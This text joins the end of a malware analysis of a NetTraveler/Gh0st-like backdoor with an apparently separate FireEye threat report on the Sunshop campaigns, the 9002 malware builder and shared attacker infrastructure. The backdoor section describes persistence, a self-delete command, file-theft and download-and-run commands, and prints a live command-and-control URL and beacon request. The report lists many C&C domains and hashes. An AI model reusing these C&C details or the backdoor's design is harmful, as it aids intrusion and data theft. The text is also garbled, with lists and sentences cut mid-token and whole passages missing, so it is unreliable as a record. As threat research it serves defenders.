beginners among malware authors and quite
widespread among common software develop-
ers.Al-
though no encryption or compression is used to
protect or hide parts of the code, simple obfus-
cation is applied to internal strings.The module
main purpose is to install and embedded DLL file
or load it during system startup.</section>

<section>
      <heading>Technical Details</heading>
Execution of the main function starts with ob-
taining local user Startup directory.This path is
appended with “\service.lnk”.<footer>41</footer>
                                                                                       
<header>The NetTraveler</header>


The strings, which are used in the application are   
stored in simple obfuscated form.For example,       
the “Kaspersky Lab” is stored as “K.sp4r6ky          
aa,”.The 1, 4, 6, 10 and 12 characters are re-      
placed with hardcoded character constants as         
shown below:

<figure></figure>


Then the module gets local %TEMP% folder path        
and constructs paths “%TEMP%\service.dll”            
and “%TEMP%\service.exe”.After that the code checks if the current module     
file name is called “service.exe”.If current module is not called “service.exe”,       
the module copies itself to “%TMP%\service.exe” and creates corresponding LNK file in lo-       
cal user’s startup folder pointing to the freshly
created executable.The executable file is as-       
signed an attribute “hidden” and started in a        
new process.Then the module checks if Kasper-       
sky products are installed on local system by        
iterating through %PROGRAMFILES% directory
and looking for “Kaspersky Lab” subdirectory.If
it finds Kaspersky products it quickly exits, if not
it attempts to self-delete by running “cmd.exe /c
del <ModuleName>” and then exits.If the module was already installed in the system
and is called “service.exe”, it checks if system mu-
tex object called “SECUT!” already exists and exits
if it’s true.This is done to avoid multiple instances
of the module from running simultaneously.After that, the module creates a new file at
“%TEMP%\service.dll” and saves a part of own
data to the new file.The data offset is hardcoded
as a string “46592”.Next, it attempts to load the “%TEMP%\service.dll” library file and call export function named
“JustTempFun”.After that the module enters
an infinite sleep loop.Although no encryption or compression is        
used to protect or hide parts of the code, simple    
obfuscation is applied to internal strings.The
module is to clearly a backdoor application that     
enables an attacker to manage files, get infor-      
mation about local disk drives, download and         
start new executables.This backdoor is probably     
authored by the same developer who created the       
Gh0st / Zegost RAT.</section>                                                     

<section>                                                     
      <heading>Technical Details</heading>                      
This module has 2 export functions: JustTemp-        
Fun and ServiceMain.Module main function as         
well as ServiceMain are empty procedures.So         
far, all functionality of the module is located in   
JustTempFun function.Meanwhile, there is another known malicious          
DLL which has exactly these export names -           
Gh0st RAT, that was also developed by Chinese.When this module is loaded with Xbox Loader
described above execution is started with Just-
TempFun exported function.This function begins
with deobfuscation of the strings used further:

pitgay.minidns.net
8090BBBBBBBBBBBB
GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
SakerEvent
FFFFFFFFFFFFFFFF
Proxy
HHHHHHHHHHHHHHHH


Obviously pitgay.minidns.net is the C&C server
domain name.8090 is the port the malware con-
nects to.As for the “GGG...”, “FFF...” and “HHH...”
strings, according to the further code analysis
they are used as a placeholders for the hardcode
proxy settings:
The “FFF...” placeholder may contain “Proxy”
string instead of “F” sequence which works as a
flag to use the proxy settings from the “GGG...”
placeholder in the form that wininet accepts
(according to MSDN, the format is “http=http://
http_proxy other”).The “HHH...” placeholder is
for proxy username and password.The purpose of this value is unclear.The module attempts to connect to a C&C server
and issue using the following URL:

http://pitgay.minidns.net:8090/3010...

Also, it uses a hardcoded User-Agent string.There is not query string parameters, the data
is transferred in a form of CGI path consisting of
hex numbers only and prefixed with 3010, which
makes such requests rather unique.3010 most
likely defines client request ID.Here is how a
request may look:

GET /301000000000F0FD...0000000000000000000
000000 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-
dows NT 5.0; .NET CLR 1.1.4322)
Host: tsgoogoo.net

Host: pitgay.minidns.net:8090
Cache-Control: no-cache

The module checks the server response code
and if that is HTTP 200, it reads 2 DWORD values
(lets call them ParamA and ParamB) from the the
server response.The first DWORD (ParamA) defines the command
and following execution path.The module also sets local            
thread privileges to enable global system shut-        
down, however this is not used later and proba-        
bly represents some remains of the code written        
earlier or another variant of the code.This is also   
confirmed by by the shutdown procedure exe-            
cuted afterwards, which is designed to disable         
Windows hook mechanism while it wasn’t used
previously anywhere in the code.1022: Self-remove                                      
This command is used to self-remove current            
module and stop its execution.Also,       
the command arguments are not separated with
space or tab characters, and it might look invalid,    
however cmd.exe on Windows XP, Windows 7 and           
Windows 8 executed it correctly without a problem.1029: File manager
The command spawns a new thread which
opens a new session with the server to provide
file management operations.The new thread makes 2 HTTP Get requests
to the server, which are identical to the 3010
request described above.The only difference
is the request ID, which is 4001 and 4002 for
the first and second requests correspondingly.The output of the 4001 request is ignored, while
request 4002 is interpreted.The server response contains 2 DWORD values:
lets call them FileCmdId and DataSize.if Data-
Size is non-zero the module fetches additional
data which length is specified in the DataSize
option.The FileCmdId defines which operation must be
executed.It can be one of the following values:

5001: Get drive information.Provides informa-
tion about specified disk drive: free space, drive
type.Client command success code is 0, error
code is 7004.5002: Get file information.Provides information
about specified file: file times, attributes.Client
command success code is 0, error code is 7003.5003: Get directory information.Provides
information about specified directory: directory


<footer>45</footer>
                                                                                     
<header>The NetTraveler</header>


times, attributes, full size.Client command suc-    
cess code is 0, error code is 7003.5004: Get directory listing.Provide simple di-      
rectory listing, which includes file names, sizes,   
last write time.Client command success code is      
0, error code is 7001.5006: Create directory.Create a new directory,      
which full path is provided by the server.Client    
command success code is 0, error code is 7016.5008: List drives.List available disk drives with
information about free space.Client command         
success code is 0, error code is not defined.5009: Run application.Run local application         
with path and command line arguments passed          
from the server.Client command success code         
is 0, error code is 7005.5017: Get recursive directory listing.Provide       
recursive directory listing.Client command suc-     
cess code is 0, error code is 7000.5025: Run pushed executable.This command            
is used to save file pushed by the server and run    
instantly.When this command is received the
module checks if it can create a new file, which     
name is passed by the server response.If it         
fails it submits error code 7003.Then it spawns     
a new thread which issues a new HTTP Post            
request with command id 3005 and system in-          
formation attached in the CGI Path.The request      
of the server should contain file data to write to
the already opened file and execute right away.5026: Upload file to the server.The command
is used to read local file and transfer it to the
server.It gets file information, including time-
stamps and size and spawns a new thread.If any
of those operations fails the module reports er-
ror code 7003 to the server.Otherwise it reports
success code 0 and spawns a new thread.The
new thread reads the file specified in the request
and uploads it to the server.1039: Download and run new module.The module uses ParamB as an integer value
indicating a length of a string to read next from
the server response.The received string will be
used as a NewFilename.Then it reads another
DWORD value from the server response and
interprets it as a size of the following data to
read.After that a new directory “Internet Ex-
plorer” is created in the directory of the current
running module.Then the module creates a new
file using the value NewFilename pushed by the
server.The module makes 2 attempts to start a
new process: by calling CreateProcessA system
API and ShellExecuteA if the previous call failed.The code was designed to support more com-
mands (1028, 1029, 1032, 1033, 1034, 1035,
1036), however they are now falling into com-
mand 1029 handler and then ignored.We cre-
ated a chart showing a tree of commands de-
pendencies:


<footer>46</footer>

<header>Appendix A: Malware technical analysis</header>

<figure></figure>


    The execution of this command processing thread continues in a loop until it is interrupt-
    ed by Shutdown command coming from the server.The code starts new loop iteration
    after hardcoded value of 30 seconds.</section>


<footer>47</footer>


</doc>This report examines 11 advanced persistent threat (APT) campaigns targeting a wide swath of industries.Though they appeared unrelated at first, further investigation uncovered several key links between them: the same malware tools, the same elements of code, binaries with the same timestamps, and signed binaries with the same digital certificates.Taken together, these commonalities point to centralized APT planning and development.How prevalent this model has become is unclear.But adopting it makes financial sense for attackers, so the findings may imply a bigger trend.This report focuses on two key findings:
•	 Shared development and logistics 
•	 A shared malware-builder tool 
</section>

<section>
<heading>Shared development and logistics</heading> 
Examining the 11 APT campaigns revealed a shared development and logistics operation used to support several APT actors in distinct but overlapping campaigns.This development and logistics operation is best described as a “digital quartermaster.” Its mission: supply and maintain malware tools and weapons to support cyber espionage.This digital quartermaster also might be a cyber arms dealer of sorts, a common supplier of tools used to conduct attacks and establish footholds in targeted systems.</section>

<section>
<heading>Shared builder tool</heading>
SFireEye researchers located a builder tool likely used in some of the 11 APT campaigns.The tools appear to be written in Chinese, and the testing infrastructure appears to all be configured with the native Chinese language character set, and the dialogues and menu options in the builder tool are in Chinese.</section>

<section>
<heading>The Sunshop connection</heading>
In May 2013, FireEye first reported on the “Sunshop” campaign, which compromised several strategic websites and redirected visitors to a site serving multiple exploits.<fn>1</fn> In August 2013, FireEye reported that the campaign was continuing<fn>2</fn> and, later that month, discovered additional related attacks.Examining the underlying infrastructure of these attacks revealed that the campaign utilized resources shared across other APT campaigns not initially tied to Sunshop.The other campaigns included multiyear onslaughts targeting companies across 15 industries.Given the wide range of targets observed, the campaigns’ specific objectives (beyond the obvious intellectual property theft) are unclear.<footnote>
 1 Ned Moran.“Ready for Summer: The Sunshop Campaign.” May 2013.2 	 Ibid.“The Sunshop Campaign Continues.” August 2013.</footnote>

<figure>

 1%1%
 2% 2%
 2%

 4% 19% High-tech Healthcare/Pharmaceuticals

 4% Financial services Higher education

 5% Telecommunications Insurance

 Federal government State and local government
 6%
 Energy/Utilities/Petroleum refining Entertainment/Media/Hospitality
 17%
 Aerospace/Defense/Airlines Legal services
 7%
 Chemicals/Manufacturing/Mining Applied research and development

 9% Services/Consulting/VAR
 11%
 10%
 <caption>Figure 1.Though the campaigns utilized varying techniques, tactics, and procedures (TTPs), they all leveraged a common development infrastructure.They shared (in various combinations) the following: 
 
•	 Portable executable resources
•	 Digital certificates 
•	 API import tables 
•	 Compile times 
•	 Command-and-control (CnC) infrastructure 
 
Based on the evidence, this report outlines the following possible conclusions: 
 
•	 [High Confidence] A “Sunshop Digital Quartermaster” (SDQ) exists and supports separate APT campaigns.FireEye believes that the most likely explanation for these links is a shared development and logistics operation that supports several APT campaigns as part of formal offensive apparatus.•	 [Low Confidence] SDQ and APT campaigns are a single actor.Another conceivable possibility is tha the 11 clusters of activity, 
 previously believed to be independent campaigns run by different actors, are in fact one cluster of activity run by one well-resourced actor.However, we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords, campaign identifiers, and mutexes.These artifacts were generally consistent within each cluster of activity but differed across clusters.• [Medium Confidence] SDQ does not exist, and APT actors informally share among each other.Alternatively, different actors may be responsible for the documented 11 clusters of activity.Instead of relying on a centralized development and logistics operation, they share TTPs through formal or informal channels.</section>

<section>

<heading>Introduction</heading>

On May 20, 2013 FireEye first reported on the Sunshop campaign.<fn>3</fn> The actor responsible for this campaign compromised a number of strategic websites, redirecting visitors to a site serving multiple exploits.Almost three months later, FireEye reported that the campaign was continuing.<fn>4</fn> We discovered additional related attacks about a week after that.During the intervening time, we examined the underlying infrastructure supporting these attacks and found that the Sunshop campaign utilized resources shared across a number of other APT campaigns not initially tied to Sunshop.What we initially believed to be 11 different APT campaigns used the same malware tools, the same elements of code, binaries with the same timestamps, and signed binaries with the same digital certificates.Through this discovery, we believe that we have identified a shared development and logistics operation used to support a number of different APT actors engaged in distinctive but overlapping campaigns.This development and logistics operation is best described as a digital quartermaster whose mission is to supply and maintain malware tools and weapons used in support of cyber espionage operations.This digital quartermaster is a possible cyber arms dealer, supplying the operators responsible for conducting attacks and establishing footholds within targeted organizations.As such, we refer to this entity as the Sunshop Digital Quartermaster (SDQ).<footnote>
 3 Ned Moran.“Ready for Summer: The Sunshop Campaign.” May 2013.4 Ibid.“The Sunshop Campaign Continues.” August 2013.</footnote>

To support this conclusion, we first present an overview of our research, including the total number and type of malicious binaries we found to be related to Sunshop and the 10 other linked campaigns.We then describe the underlying infrastructure, including the components of code used across these campaigns.We further describe the different clusters of APT activity that we previously believed to be unrelated.Finally, we describe one of the malware builders we believe was used to support one of these clusters of APT activity.</section>

<section> 
<heading>Overview</heading> 
We collected 110 unique binaries, which were detected as Trojan.APT.9002, Trojan.APT.PoisonIvy, Trojan.APT.Gh0st, Trojan.APT.Kaba, and Trojan.APT.Briba.Sixty-five of these binaries were packaged with two unique manifest resources, and 47 were signed with six different digital certificates.The binaries connected to 54 unique fully qualified domains.<table> 
 Detection Number of Samples
 Trojan.APT.9002 70 
 Trojan.APT.PoisonIvy 26 
 Trojan.APT.Gh0st 12 
 Trojan.APT.Kaba 1
 
 
 Trojan.APT.Briba 1
<caption>Table 1: APT malware samples linked to the SDQ</caption>
</table>

We identified these samples by searching binaries packaged with the two unique portable executable (PE) resources that we had previously identified.We believe that these PE resources are unique to Sunshop and the 10 other linked campaigns.We also searched for samples signed with the six different digital certificates that were used to sign binaries connected to these campaigns.These certificates were not unique to these campaigns and have been used to sign unrelated malware.Therefore, we cross-checked samples signed with any of these certificates to ensure that they were, in fact, related to the 10 campaigns we identified as linked to Sunshop.As we identified related campaigns that leveraged the unique PE resources or digital certificates, we then pivoted off the CnC infrastructure to identify additional samples.We cross-checked samples identified through this process to ensure that they did indeed share the code elements that we previously identified as unique to Sunshop and its associated campaigns.We searched our internal repositories, including the FireEye high performance cluster and other wellknown external repositories.We primarily relied on running active searches with YARA signatures designed to identify samples, with either the PE resources or digital certificates.We also compared the import tables used in each sample to establish additional links between the 10 different campaigns linked to Sunshop.All of this research led us to the above-mentioned 110 binaries.Figure 2 plots the samples in a Maltego chart.<figure><caption>Figure 2.Eleven seemingly different APT campaigns</caption></figure>

Figure 2 shows only domains, IP addresses, and MD5 malware/dropper hashes collected during our research.These limited data points display 11 different and seemingly independent clusters of activity.We continued our analysis by adding the following additional data points to our graph.•	 Two portable executable (PE) resources used by 64 samples in our collection

• Six different digital certificates used by 47 samples in our collections

• Hashes of the different import tables used by the binaries in our graph

These additional data points linked the 11 different clusters of activity and revealed what we believe to be a shared development logistics infrastructure.<figure><caption>Figure 3.Eleven APT campaigns linked to the SDQ</caption></figure>


Figure 3 illustrates the overlaps and connections that exist between what initially appeared to be 11 independent campaigns.This chart shows how the additional data points of the shared PE resources, commonly used digital certificates, and identical import tables can link these different campaigns together.</section>

<section>
<heading>Cluster Analysis Techniques</heading> 
Our research analyzed the following to identify and tie all 11 campaigns to the SDQ: 
•	 PE resources
•	 Import tables 
•	 Authenticode/Digital certificates
•	 Compile times 
</section>

<section>
<heading>PE resource</heading> 
We found that 64 of the 110 samples analyzed during this analysis were packaged with two almost identical portable executable resources.In both cases, the resources appeared to be manifests generated by the Nullsoft scriptable installation system (NSIS).Nullsoft is a script-driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system.</section>

<section>
<heading>Sunshop manifest</heading>
We identify the first of these manifest resources as the “Sunshop manifest.” It has these properties:

<code>
MD5
f9e2887828846b3d383bdf9d0fded5e3
</code>

<code>
SHA256
82a98c88d3dd57a6ebc0fe7167a868
75ed52ebddc6374ad640407 efec01b1393
</code>

The full text of the PE resource manifest is shown in Figure 4.Sunshop PE resource manifest</caption>


We found 44 unique binaries packaged with the above Sunshop manifest.These samples were detected as Trojan.APT.9002, Trojan.APT.Gh0st, and Trojan.APT.PoisonIvy.We observed these 44 samples used in eight of the 11 different campaigns discussed below.DTL PE resource manifest</caption>

<figure><caption>Figure 6.Comparison of Sunshop (left) and DTL (right) PE resource manifests</caption></figure>


We found 20 samples using the DTL manifest.These binaries were detected as Trojan.APT.9002.We observed these 20 samples used in five of the 11 different campaigns discussed below.The only difference between these manifest resources is the indentation of the <security> elements.Lines 10 through 13 in Figure 6 detail this difference.This slight difference results in a different hash for the resource.The similarity between these two manifests would likely go unnoticed by automated analysis.Also, the XML is improperly formatted, hinting that it was formatted manually.As an experiment, we used NSIS v2.34 to create our own simple installer and found that the XML in the manifest had no new-line or tab characters.</section>

<section>
<heading>Import tables</heading>
We utilized a simple technique to identify similarities in import tables between the 110 different samples we analyzed during our analysis.We aggregated the import calls found in each sample and used this as a unique fingerprint.We then used these fingerprints to cluster similar samples together.The Python code in Figure 6 relies on the module pefile and can be used to dump all the import calls used in a specific binary.The output can then be easily hashed.<code>

 pe = pefile.PE(file)
 for entry in pe.DIRECTORY_ENTRY_IMPORT:
 for imp in entry.imports:
 if imp.name != None:
 print entry.dll, imp.name, hex(imp.address)
 else:
 print entry.dll, hex(imp.address)
</code>
 <caption>Figure 7.Python code to dump all import calls used in a specific binary</caption>

We found 33 unique import tables used for the 110 different samples we collected during our  research.The most common import table seen 
had a MD5 hash of 3a7faeac22e6ab5c3c28a2b617901b51 and appeared in 38 different binaries.This particular import table appeared in both Trojan.APT.9002 and Trojan.APT.PoisonIvy binaries.It was used in eight of the 11 different clusters of activity we studied during this analysis.In addition to the identical import tables, these samples have the same code base, differing in the unpacking routine for the actual payload, indicating that they are general-purpose launchers.Upon execution, the malware samples with the import table hash of 3a7faeac22e6ab5c3c28a2b617901b51 called back to these domains and IP addresses: 
 
•	 ieee.boeing-job[.]com 
•	 lol.dns-lookup[.]us
•	 twn.ftpmicrosoft[.]com
•	 127.0.0.1
•	 piping.no-ip[.]org
•	 wv.downmicrisoft[.]com
•	 mx.downmicrisoft[.]com
•	 update1.mysq1[.]net
•	 ru.pad62[.]com
•	 phpweb.zapto[.]org
•	 asp.homesvr.linkpc[.]net
•	 dns.homesvr[.]tk
•	 ssl.homesvr[.]tk

The second most common import table had a MD5 hash of f6d9eda2b4ab23b1f2be49e1a4f9a1f7 and appeared in 12 different samples.These 12 samples were all detected as Trojan.APT.PoisonIvy and appeared in only one of the 10 campaigns discussed below.Upon execution, all of the malware samples with this import table hash beaconed to these domains:

• luckmegame.servegame[.]com
• luckmevnc.myvnc[.]com

The third most common import table had a MD5 hash of 71213bd677edc82c6ef30cb505c13dec and appeared in nine different samples.These samples were all detected as Trojan.APT.9002 and appeared in three of the 10 campaigns we analyzed.Upon execution, these samples called back to these domains:

• engage.intelfox[.]com
• ru.pad62[.]com
• tank.hja63[.]com
• dtl.eatuo[.]com
• dtl6.mooo[.]com
• dtl.dnsd[.]me
</section>

<footer>12 www.fireeye.com</footer>
<header>Supply Chain Analysis: From Quartermaster to Sunshop</header>

<section>
<heading>Authenticode/digital certificates analysis</heading> 

Digital certificates are used to validate the authenticity of code.Attackers often use stolen or spoofed digital certificates to sign their malicious code and improve the likelihood that their code will execute successfully on its target.During our research, we found six digital certificates used to sign 44 different malware samples.These certificates are currently revoked or expired and were signed by Microsoft, Sinacom, Facesun.cn, Mgame Corp, Guangzhou YuanLuo Technology Co., Ltd., and Wuhan Tian Chen Information Technology Co., Ltd.The full details of these certificates are available in Appendix A.According to Kaspersky, the Mgame Corp. and Guangzhou YuanLuo Technology Co., Ltd. certificates were stolen.<fn>5</fn> Whether the remaining certificates were also stolen—or were ever valid—is unclear.The certificates from Mgame Corp and Wuhan Tian Chen Information Technology Co. ,Ltd. were used most frequently.We found 24 samples signed with the certificate from Mgame Corp.These samples were all detected as Trojan.APT.9002 and appeared in four of the 10 campaigns we studied during this research.We found 15 samples signed with the certificate from Wuhan Tian Chen Information Technology Co., Ltd.These samples were all detected as Trojan.APT.PoisonIvy and appeared in one of the 10 campaigns discussed below.</section>

<section> 
<heading>Compile times</heading> 
Although the compilation time of binaries can be easily forged, analyzing them is still useful.The timestamp may not reveal when a binary was actually compiled, but it can be used to cluster samples by identical compile times.The most common compile time was December 19, 2012 at 20:25.We found 28 binaries compiled at this time.All of these binaries were detected as Trojan.APT.9002 and utilized the Sunshop PE resource.We observed samples with this timestamp in six of the 11 clusters of APT activity we studied during this research.The next most common compile time was July 21, 2012 at 14:50.We identified five samples compiled at this time.All of these samples were detected as Trojan.APT.9002 and utilized the DTL PE resource.These samples appeared in two of the 11 campaigns.The use of this same compile times across a number of different campaigns is another indication that a common development and logistics infrastructure supported these disparate operations.</section>

<section>
<heading>Clusters</heading>
The shared characteristics were used across malware tools used in at least 11 different clusters of APT activity.These clusters were originally believed to be separate and distinct campaigns and were grouped together based on shared CnC infrastructure using passive DNS data or registration information.</section>

<section>
<heading>Cluster 1: Sunshop</heading>

The Sunshop campaign appears to primarily leverage strategic Web compromise as a vector of attack.We have detailed the specifics of the Sunshop campaign on the FireEye blog.<fn>6</fn> We found 15 different samples linked to the Sunshop campaign.These samples were detected as Trojan.APT.Gh0st, Trojan.APT.PoisonIvy, Trojan.APT.Briba, and Trojan.APT.9002.All of the Sunshop samples that we identified had compile times between January 1, 2013 and August 24, 2013.Twelve of the 15 utilized the Sunshop PE resource, and none was signed with any of the six identified digital certificates.<footnote>
 5 Securelist.“Winnti FAQ.More than just a game.” April 2013.6 	 See http://www.fireeye.com/blog/technical/cyber-exploits/2013/05/ready-for-summer-the-sunshop-campaign.html and http://www.fireeye.com/blog/technical/cyber-exploits/2013/08/the-sunshop-campaign-continues.html.</footnote>

 
When executed, the Sunshop samples beaconed to these CnC servers: 
•	 appupdate.myvnc[.]com
•	 asp.homesvr.linkpc[.]net
•	 dns.homesvr[.]tk 
•	 9ijhh45.zapto[.]org
•	 newtibet[.]tk
•	 ssl.homesvr[.]tk
•	 nameserver1.zapto[.]org
•	 phpweb.zapto[.]org 
• homeweb.sytes[.]net
• intelupdate.hopto[.]org
• ajaxcode.zapto[.]org
• updateinfor.hopto[.]org
• mynews.sytes[.]net

• The campaign targeted these industries:
• State and local government
• Telecommunications
• Legal services

Table 2 outlines Sunshop-related malware and compile times.We found seven different samples linked to the DTL campaign.All of these samples were detected as Trojan.APT.9002.These samples were compiled between September 19, 2012 and July 30, 2013.All of these samples were packaged with the DTL PE resource, and one of the samples was signed with the digital certificate from Mgame Corp.When executed, the DTL samples called back to these CnC servers:
 
•	 dtl.eatuo[.]com
•	 dtl.dnsd[.]me
•	 dtl6.mooo[.]com
•	 img.advertisingsee[.We found 26 different samples linked to the Ru.pad62 campaign.These samples were detected as Trojan.APT.9002, Trojan.APT.Gh0st, Trojan.APT.Kaba, and Trojan.APT.PoisonIvy.The 26 linked samples had compile timestamps between September 19, 2011 and December 19, 2012.Ten of the samples from the Ru.pad62 campaign were packaged with the DTL resource, and six of the samples were packaged with the Sunshop resource.Only four samples linked to the Ru.pad62 campaign were signed with digital certificates—two with the Mgame Corp. certificate and two with a certificate from Microsoft.When executed, the Ru.pad62 samples we found called back to these CnC servers:

 • ru.pad62[.]com
 • tank.hja63[.]com
 • 173.234.184[.]45
 • fly.pad62[.]com
 • tho.pad62[.]com
 • tho.hja63[.We found five different samples linked to the Downmicrisoft campaign.These samples were detected as Trojan.APT.9002 and Trojan.APT.Gh0st.The five samples had compile timestamps between December 19, 2012 and April 4, 2013.The earliest compile time for samples from the Downmicrisoft campaign (December 19, 2012) was the same day as the latest compile time for samples from the Ru.Pad62 campaign.Three of the samples linked to the Downmicrisoft campaign were packaged with the Sunshop PE resource, and all but one sample was signed with the Mgame Corp. digital certificate.When executed, the Downmicrisoft samples called back to these CnC servers:

• wv.downmicrisoft[.]com
• mx.downmicrisoft[.]com
• up.downmicrisoft[.]com
• tebit-newtwn.ftpmicrosoft[.]com
• twn.ftpmicrosoft[.]com

The campaign targeted these industries:

• Entertainment/Media/Hospitality
• High-tech

The same media organization targeted in the Downmicrisoft campaign was also targeted in the Ru.Pad62 campaign.Instead, this sample used the string “HTTPS”.Gh0st variants with this same string were described by RSA in a 2012 paper.<fn>7</fn>
</section>

<section> 
<heading>Cluster 5: Boeing-Job</heading>

The Boeing-Job campaign appears to utilize strategic Web compromises as an initial infection vector.We previously discussed the Boeing-Job campaign’s use of the “Lady Boyle” Flash exploit on the FireEye blog.<fn>8</fn> We identified 19 different samples linked to the Boeing-Job campaign.These samples were all detected as Trojan.APT.9002 and had compile timestamps between July 21, 2012 and April 3, 2013.Seven of the samples from the Boeing-Job campaign were packaged with both the Sunshop PE resource, and all but two were  signed with the Mgame Corp. digital certificate.When executed, the Boeing-Job samples called back to these CnC servers:

• www.boeing-job[.]com
• engage.intelfox[.]com
• ieee.boeing-job[.]com
• lol.dns-lookup[.]us
• 127.0.0.1

The campaign targeted these industries:

• Financial services
• Energy/Utilities/Petroleum refining
• Telecommunications

<footnote>
 7 RSA.“The Voho Campaign: an In Depth Analysis.” September 2012.8 	 Thoufique Haq and J. Gomez.“LadyBoyle Comes to Town with a New Exploit.” February 2013.We identified seven different samples linked to the Google-blogspot campaign.These samples were all detected as Trojan.APT.Gh0st or Trojan.APT.PoisonIvy.The Google-blogspot samples had compile timestamps between September 16, 2008 and June 27, 2012.Four of the samples from the Google-blogspot campaign were packaged with the Sunshop PE resource, and one sample was signed with a digital certificate  from Facesun.cn.When executed, the Google-blogspot samples called back to these CnC servers:

• soft.google-blogspot[.]com
• www.google-blogspot[.]com
• blog.googleblog.iego[.We identified 18 different samples linked to the Luckme campaign.These samples were all detected as Trojan.APT.PoisonIvy and had compile timestamps between April 3, 2011 and April 3, 2013.Four of the samples from the Luckme campaign were packaged with the Sunshop PE resource.Fifteen of the Luckme samples were signed with the digital certificate  from Wuhan Tian Chen Information Technology Co., Ltd.When executed, Luckme samples called back to these CnC servers:
 
•	 luckmegame.servegame[.]com
•	 luckmevnc.myvnc[.]com
•	 huangma.dyndns[.]org
• zhouweb.dyndns[.]info
• frontpage.dyndns[.]org
• frontpage.dhis[.]org
• blankorder.zapto[.]org
• blankorder.dyndns-mail[.]com
• registrat.dyndns[.]org
• registrat.zapto[.We identified four different samples linked to the Piping campaign.These samples were detected as Trojan.APT.PoisonIvy and Trojan.APT.9002.The Piping linked samples had compile timestamps between December 19, 2012 and January 2, 2013.All of the samples from this campaign were packaged with the Sunshop PE resource, and none was signed with a digital certificate.When executed, the Piping samples called back to these CnC servers:
<list>
•	 koko4w.no-ip[.]org
• okok4o.zapto[.]org
• blabla4m.no-ip[.]org
• piping.no-ip[.We identified five different samples linked to the Update1 campaign.All of these samples were detected as Trojan.APT.9002 and had compile timestamps between July 30, 2012 and December 19, 2012.One of the Update1 samples was packaged with the Sunshop PE resource and one was packaged with the DTL PE resource.None of the samples was signed with a digital certificate.When executed, the Update1 samples called back to these CnC servers:
<list>
• update1.mysq1[.]net
• update.mysq1[.]net
• pack.fartit[.]com
• updatedns.itemdb[.We identified one Trojan.APT.9002 sample linked to the Packets campaign.This sample had a compile time of December 19, 2012 and was packaged with the Sunshop PE resource.The sample was not signed with a digital certificate.It called back to this CnC server: mlog.ddns[.]us 
</section>

<section>
<heading>Cluster 11: Allshell</heading>
The Allshell campaign appears to utilize spear-
phishing email as a vector to attack its targets.We
identified one Trojan.APT.9002 sample linked to
the Allshell campaign.This sample had a compile
time of October 16, 2012 and was packaged with
the DTL PE resource.The sample was not signed
with a digital certificate.It called back to this CnC
server:

• stmp.allshell[.Builders are tools used by malicious actors to
quickly and easily create different variants of the 
same malware.In a typical scenario, a skilled
developer creates a builder and shares it with an 
operator more skilled in intrusion operations than
in code development.This separation of tasks is 
more efficient and supports a faster tempo of
offensive operations.A typical builder provides a 
graphical user interface that enables a threat
actor to configure elements such as the location of
the CnC server.<figure></figure>

 <caption>Figure 10: Builder used to generate
 Trojan.APT.9002 malware</caption>




<footer>25 www.fireeye.com</footer>
<header>Supply Chain Analysis: From Quartermaster to Sunshop</header>




As shown in Figure 10, the dialogue and menu 
options in this GUI are in Chinese.The builder 
enables threat actors to configure the following: 

•	 Both a primary and a secondary CnC server.•	 A specific ID.The default ID produced by this 
 builder is “1.” 
 
•	 An “Internet health check” domain.The 
 default health check domain configured in 
 this builder was “update.microsoft.com”.An
 Internet health check domain is typically used 
 by malware to determine whether a target’s 
 endpoint is connected to the Internet before
 acting.• Proxy settings, including address/port, type,
 proxy authentication details, auto-detect
 proxy, and force-proxy only.Also, the text in the title bar of this builder is
“[User_Server_Builder] update 2012-7-21”.Although the servers produced by this builder
have a compile time of 10/23/12 8:30 UTC, we
believe the date in the title bar of the builder is
significant; we identified five different binaries
with a compile time of 7/21/12.All five utilized the same DTL resource found in
9002 Builder.<table>
 MD5 Hash Compile Time CnC Server PE Resource

 a24992c89c4a8dd83b5e910131054c60 7/21/12 14:50 engage.intelfox[.]com DTL
 1bd468332c0dfc8ba2a3a5f286f20b7a 7/21/12 14:50 ru.pad62[.]com DTL
 859301c5874ca3739e8ac81ddfc676e6 7/21/12 14:50 ru.pad62[.]com DTL
 58e81154a87cc93d546c4c45de9b1ec3 7/21/12 14:50 ru.pad62[.]com DTL
 6ef66c2336b2b5aaa697c2d0ab2b66e2 7/21/12 14:50 tank.hja63[.]com DTL

</table>
 <caption>Table 13: Malware samples created by a builder using
 the same DTL resource found in 9002 Builder</caption>




<footer>26 www.fireeye.com</footer>
<header>Supply Chain Analysis: From Quartermaster to Sunshop</header>




The 9002 Builder appears to be a modified variant 
of the builder used to create the samples listed in 
Table 12.The compile time of the builder is 
10/23/2012 11:18 UTC, a little less than 3 hours 
after the compile time of the server that is 
produced by it.We believe it is a common practice 
for the developer to compile a new server, update 
the builder code accordingly, then compile the 
new builder.The older date in the title bar may 
just be an oversight as i t would have to be 
manually updated by the developer.The builder contains a copy of the server
executable in its PE resource section, under BIN.The server executable is responsible for installing
the 9002 payload malware, and has its
configuration block stored in its .data section,
with some default settings including the CnC
pointing to 192.168.8.105.The configuration
block uses simple, single-byte XOR encryption.The key varies from version to version; in some
cases, it skips null bytes.During the installation
routine, the configuration block is written to the
registry value sysinfo under the registry key
HKCU\Software\Classes.<figure></figure>

 <caption>Figure 11: T9002 Builder configuration block
 before (left) and after (right) XOR decryption</caption>




<footer>27 www.fireeye.com</footer>
<header>Supply Chain Analysis: From Quartermaster to Sunshop</header>




When the threat actor builds a malware 
executable, the builder writes the server 
executable to disk and overwrites the
configuration block with the newly configured 
options.The location of the configuration block 
within the .data section is hard-coded, meaning 
that the builder must be modified each time the 
server code is updated and the location of the 
configuration block changes.We noticed that the 
configuration block is indeed stored at a different 
offset in the samples compiled on 7/21/12 as 
compared to the sample created by the builder 
we have with the compile date of 10/23/12.This 
further supports our belief in the practice of the 
developer compiling the server and then shortly 
after compiling the builder.He would need time 
to locate the new offset of the configuration 
block in the newly compiled server executable 
and then change the hard-coded value in the
builder code.Attackers using 9002 Builder seem to have
gradually adopted another launcher that stores
the configuration block as a resource instead of
storing it in its .data section.Based on the
compile-time analysis outlined in the “Compile
Times” section of this report, the shift began in
late October of 2012 (with a few exceptions).This
shift makes sense for the builder’s developer(s);
they no longer needed to update the builder for
every code change in the launcher or 9002
payload malware.This launcher, mentioned earlier
in this paper as having the import table hash
3a7faeac22e6ab5c3c28a2b617901b51,
supports different payloads, such as Poison Ivy
